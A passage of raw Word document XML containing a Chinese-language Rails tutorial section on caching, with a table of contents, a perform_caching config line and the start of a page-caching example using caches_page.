          <w:p w14:paraId="45DF6843"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=&gt; Booting Mongrel (use 'rails server webrick' to force WEBrick)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26AFB7CB"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 xml:space="preserve">=&gt; Rails 3.1.0 application starting on </w:t>
            </w:r>
            <w:hyperlink r:id="rId910" w:history="1">
              <w:r w:rsidRPr="0091039A">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>http://0.0.0.0:3000</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w14:paraId="3E2ABE56" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="673E17ED" w14:textId="76A6CF50" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="002B5D47" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>5.10、</w:t>
      </w:r>
      <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Rails中使用缓存：概述</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5428C87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本指南将会教你怎样去避免高成本的数据库读取和尽可能花最短的时间返回你所需要内容的到 web 客户端。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B9EA61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阅读本指南后，你将能够使用和配置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505690AE" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="250"/>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页面，action，和片段的缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F93243" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="250"/>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Sweepers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0A0005" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="250"/>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可选择的 cache 存储方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAF84D3" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="250"/>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有条件的 GET 支持</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548777A8"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目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C063C2C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="251"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId911" w:anchor="1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>基本的缓存</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="463F6383"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12" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>页面缓存</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="08D9786D"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13" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Action 缓存</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="19EDAD4A"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14" w:anchor="1-3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>片段缓存</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E1DB27E"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15" w:anchor="1-4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>清理器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="645577F8"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16" w:anchor="1-5" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>SQL 缓存</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3DE84A06" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="251"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId917" w:anchor="2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>缓存存储</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="136C955C"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18" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="47AAA158"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19" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveSupport::Cache::Store</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="77FC8C46"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20" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveSupport::Cache::MemoryStore</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2E9E5B6F"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21" w:anchor="2-4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveSupport::Cache::FileStore</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0C266A7F"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22" w:anchor="2-5" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveSupport::Cache::MemCacheStore</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="38D05451"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23" w:anchor="2-6" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveSupport::Cache::EhcacheStore</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2B3F7A86"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24" w:anchor="2-7" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveSupport::Cache::NullStore</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D4C2B04"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25" w:anchor="2-8" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>自定义的缓存存储</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2E1B051B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="251"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId926" w:anchor="2-9" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Cache Keys</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5D9FAFAE" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="251"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId927" w:anchor="3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>有条件的 GET 支持</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="52237C01" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="251"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId928" w:anchor="4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>更多阅读</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="36590B61"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1 基本的缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111659F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这是一份对三种 Rails 提供的不需要第三方插件支持的缓存技术的介绍。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2186F8E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如果在开发模式下，使用缓存首先要确保 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller.perform_caching</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。通常是在对应的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/environments/*.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下设置，在开发和测试模式下通常缓存默认为不使用用，在生产环境下为使用的。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0A86F018" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5207A662" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1602949989"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.action_controller.perform_caching = true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75B5912C"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1.1 页面缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518F37A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页面缓存是一种 Rails 的机制，它允许请求已经由 webserver （如：Apache 或 nginx）生成的页面 ，而不需要通过 Rails 的栈。很明显地这非常快，但它不能在所有的情况下使用（例如需要认证的页面）。而且因为 webserver 是直接的从文件系统中请求文件，cache 失效也是一个需要处理的问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E55CBA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使用页面缓存，你需要使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>caches_page</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="60BFF773" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C73311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ProductsController &lt; ActionController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A2F34C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7008353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caches_page :index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05EF76E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4EB1144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index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A63762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@products</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Products.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54B997C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6EFFA73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3F84CF6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假如有个控制器为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ProductsController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 然后有个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 action 列出所有的产品 （products），任何第一次请求 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/products</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 时 Rails 会生成一个文件：</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>products.html</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 而且 webserver 会查找那个文件直到下次向 Rails 应用程序请求 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/products</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6516112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页面的缓存目录默认设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.public_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> （这就是通常设置的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
